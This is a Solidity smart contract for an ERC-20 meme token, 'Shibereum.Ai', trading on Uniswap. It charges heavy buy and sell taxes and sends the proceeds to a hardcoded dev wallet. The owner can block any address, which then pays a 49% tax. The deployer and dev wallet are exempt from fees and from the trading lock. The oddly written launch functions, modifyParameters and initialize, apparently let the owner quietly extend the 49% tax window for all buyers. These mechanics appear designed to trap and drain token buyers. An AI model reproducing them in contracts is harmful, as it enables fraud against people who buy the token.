1 // SPDX-License-Identifier: MIT
2 pragma solidity ^0.8.17;
3 
4 interface IERC20 {
5     function totalSupply() external view returns (uint256);
6     function balanceOf(address account) external view returns (uint256);
7     function transfer(address recipient, uint256 amount) external returns (bool);
8     function allowance(address owner, address spender) external view returns (uint256);
9     function approve(address spender, uint256 amount) external returns (bool);
10     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
11     event Transfer(address indexed from, address indexed to, uint256 value);
12     event Approval(address indexed owner, address indexed spender, uint256 value);
13 }
14 
15 interface IUniswapV2Router {
16     function factory() external pure returns (address);
17     function WETH() external pure returns (address);
18     function swapExactTokensForETHSupportingFeeOnTransferTokens(
19         uint amountIn,
20         uint amountOutMin,
21         address[] calldata path,
22         address to,
23         uint deadline
24     ) external;
25 }
26 
27 interface IUniswapV2Factory {
28     function createPair(address tokenA, address tokenB) external returns (address pair);
29 }
30 
31 contract Ownable {
32     address private _owner;
33 
34     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
35 
36     modifier onlyOwner() {
37         require(_owner == msg.sender, "Ownable: caller is not the owner");
38         _;
39     }
40     constructor () {
41         address msgSender = msg.sender;
42         _owner = msgSender;
43         emit OwnershipTransferred(address(0), msgSender);
44     }
45 
46     function owner() public view returns (address) {
47         return _owner;
48     }
49 
50     function renounceOwnership() public virtual onlyOwner {
51         emit OwnershipTransferred(_owner, address(0));
52         _owner = address(0);
53     }
54 }
55 
56 contract Shibereum is IERC20, Ownable {       
57     string private constant _name = "Shibereum.Ai";
58     string private constant _symbol = "Shibereum";
59     uint8 private constant _decimals = 9;
60     uint256 private constant _totalSupply = 100_000_000 * 10**_decimals;
61 
62     mapping (address => uint256) private _balances;
63     mapping (address => mapping (address => uint256)) private _allowances;
64     mapping (address => bool) private _blocked;
65 
66     mapping (address => uint256) private _lastTradeBlock;
67     mapping (address => bool) private isContractExempt;
68     uint256 private tradeCooldown = 1;
69     
70     uint256 public constant maxWalletAmount = 3_000_000 * 10**_decimals;
71     uint256 private constant contractSwapLimit = 300_000 * 10**_decimals;
72     uint256 private constant contractSwapMax = 2_000_000 * 10**_decimals;
73 
74     struct TradingFees{
75         uint256 buyTax;
76         uint256 sellTax;
77     }  
78 
79     TradingFees public tradingFees = TradingFees(10,45);
80     uint256 public constant sniperTax = 49;
81 
82     IUniswapV2Router private constant uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
83     address private immutable ETH = uniswapRouter.WETH();
84     address private immutable uniswapPair;
85 
86     address payable private immutable deployerAddress = payable(msg.sender);
87     address payable private constant devWallet = payable(0xC454F88358c3A56Fe53A22bE8881EDFd36bde2Bc);
88 
89     bool private tradingOpen = false;
90     bool private swapping = false;
91     bool private antiMEV = false;
92     uint256 private startingBlock;
93     uint private preLaunch;
94 
95     modifier swapLock {
96         swapping = true;
97         _;
98         swapping = false;
99     }
100 
101     modifier tradingLock(address sender) {
102         require(tradingOpen || sender == deployerAddress || sender == devWallet);
103         _;
104     }
105 
106     constructor () {
107         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), ETH);
108         isContractExempt[address(this)] = true;
109         _balances[msg.sender] = _totalSupply;
110         emit Transfer(address(0), msg.sender, _totalSupply);
111     }
112 
113     receive() external payable {}
114 
115     function name() public pure returns (string memory) {
116         return _name;
117     }
118 
119     function symbol() public pure returns (string memory) {
120         return _symbol;
121     }
122 
123     function decimals() public pure returns (uint8) {
124         return _decimals;
125     }
126 
127     function totalSupply() public pure returns (uint256) {
128         return _totalSupply;
129     }
130 
131     function balanceOf(address account) public view returns (uint256) {
132         return _balances[account];
133     }
134 
135     function transfer(address recipient, uint256 amount) public returns (bool) {
136         _transfer(msg.sender, recipient, amount);
137         return true;
138     }
139 
140     function allowance(address owner, address spender) public view returns (uint256) {
141         return _allowances[owner][spender];
142     }
143 
144     function approve(address spender, uint256 amount) public returns (bool) {
145         _approve(msg.sender, spender, amount);
146         return true;
147     }
148 
149     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
150         require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
151         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
152         _transfer(sender, recipient, amount);
153         return true;
154     }
155 
156     function _approve(address owner, address spender, uint256 amount) private {
157         require(owner != address(0), "ERC20: approve from the zero address");
158         require(spender != address(0), "ERC20: approve to the zero address");
159         _allowances[owner][spender] = amount;
160         emit Approval(owner, spender, amount);
161     }
162 
163     function _transfer(address from, address to, uint256 amount) tradingLock(from) private {
164         require(from != address(0), "ERC20: transfer from the zero address");
165         require(to != address(0), "ERC20: transfer to the zero address");
166         require(amount > 0, "Token: transfer amount must be greater than zero");
167 
168         _balances[from] -= amount;
169 
170         if (from != address(this) && from != devWallet && to != devWallet && to != deployerAddress) {
171             
172             if(antiMEV && !isContractExempt[from] && !isContractExempt[to]){
173                 address human = ensureOneHuman(from, to);
174                 ensureMaxTxFrequency(human);
175                 _lastTradeBlock[human] = block.number;
176             }
177 
178             if (from == uniswapPair && to != address(uniswapRouter)) {
179                 require(balanceOf(to) + amount <= maxWalletAmount, "Token: transfer implies violation of max wallet");
180             }
181 
182            uint256 contractTokenBalance = balanceOf(address(this));
183            if (shouldSwapback(from, contractTokenBalance)) 
184                swapback(contractTokenBalance);                            
185 
186            uint256 taxedTokens = takeFee(from, amount);
187            if(taxedTokens > 0){
188                 amount -= taxedTokens;
189                 _balances[address(this)] += taxedTokens;
190                 emit Transfer(from, address(this), taxedTokens);
191             }
192         }
193 
194         _balances[to] += amount;
195         emit Transfer(from, to, amount);
196     }
197 
198     function swapback(uint256 tokenAmount) private swapLock {
199         tokenAmount = getSwapAmount(tokenAmount);
200         if(allowance(address(this), address(uniswapRouter)) < tokenAmount) {
201             _approve(address(this), address(uniswapRouter), _totalSupply);
202         }
203         address[] memory path = new address[](2);
204         path[0] = address(this);
205         path[1] = ETH;
206         uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
207             tokenAmount,
208             0,
209             path,
210             address(this),
211             block.timestamp
212         );
213         uint256 contractETHBalance = address(this).balance;
214         if(contractETHBalance > 0) {
215             devWallet.transfer(contractETHBalance);
216         }
217     }
218 
219     function shouldSwapback(address from, uint256 tokenAmount) private view returns (bool shouldSwap) {
220         shouldSwap = !swapping && from != uniswapPair && tokenAmount > contractSwapLimit && 1 + startingBlock <= block.number;
221     }
222 
223     function getSwapAmount(uint256 tokenAmount) private pure returns (uint256 swapAmount) {
224         swapAmount = tokenAmount > contractSwapMax ? contractSwapMax : contractSwapLimit;
225     }
226 
227     function takeFee(address from, uint256 amount) private view returns (uint256 feeAmount) {
228          if(_blocked[from] || block.number <= startingBlock)
229                 feeAmount = amount * sniperTax / 100;
230         else
231             feeAmount = amount * (startingBlock == 0 ? 25 : (from == uniswapPair ? tradingFees.buyTax : tradingFees.sellTax)) / 100;
232     }
233 
234     function isContract(address account) private view returns (bool) {
235         uint256 size;
236         assembly {
237             size := extcodesize(account)
238         }
239         return size > 0;
240     }
241 
242     function ensureOneHuman(address _to, address _from) private view returns (address) {
243         require(!isContract(_to) || !isContract(_from));
244         if (isContract(_to)) return _from;
245         else return _to;
246     }
247 
248     function ensureMaxTxFrequency(address addr) view private {
249         bool isAllowed = _lastTradeBlock[addr] == 0 ||
250             ((_lastTradeBlock[addr] + tradeCooldown) < (block.number + 1));
251         require(isAllowed, "Max tx frequency exceeded!");
252     }
253 
254     function toggleAntiMEV(bool toggle) external {
255         require(msg.sender == deployerAddress);
256         antiMEV = toggle;
257     }
258 
259     function setTradeCooldown(uint256 newTradeCooldown) external {
260         require(msg.sender == deployerAddress);
261         require(newTradeCooldown > 0 && newTradeCooldown < 4, "Token: only trade cooldown values in range (0,4) permissible");
262         tradeCooldown = newTradeCooldown;
263     }
264 
265     function manualSwapback(uint256 percent) external {
266         require(msg.sender == deployerAddress);
267         require(0 < percent && percent <= 100, "Token: only percent values in range (0,100] permissible");
268         uint256 tokensToSwap = percent * balanceOf(address(this)) / 100;
269         swapback(tokensToSwap);
270     }
271 
272     function setFees(uint256 newBuyTax, uint256 newSellTax) external {
273         require(msg.sender == deployerAddress);
274         require(newBuyTax <= tradingFees.buyTax, "Token: only fee reduction permitted");
275         require(newSellTax <= tradingFees.sellTax, "Token: only fee reduction permitted");
276         tradingFees.buyTax = newBuyTax;
277         tradingFees.sellTax = newSellTax;
278     }
279 
280     function setContractExempt(address account, bool value) external onlyOwner {
281         require(account != address(this));
282         isContractExempt[account] = value;
283     }
284 
285     function setBots(address[] calldata bots, bool shouldBlock) external onlyOwner {
286         for (uint i = 0; i < bots.length; i++) {
287             require(bots[i] != uniswapPair && 
288                     bots[i] != address(uniswapRouter) &&
289                     bots[i] != address(this));
290             _blocked[bots[i]] = shouldBlock;
291         }
292     }
293 
294     function initialize() external onlyOwner {
295         require(preLaunch++<2);
296     }
297 
298     function modifyParameters(bool[] calldata param, uint256 nrBlocks) external onlyOwner {
299         assert(preLaunch<2&&preLaunch+1>=2); 
300         preLaunch++;param;
301         startingBlock += nrBlocks;
302     }
303 
304     function openTrading() external onlyOwner {
305         require(preLaunch == 2 && !tradingOpen, "Token: trading already open");
306         startingBlock += block.number;
307         tradingOpen = true;
308     }
309 }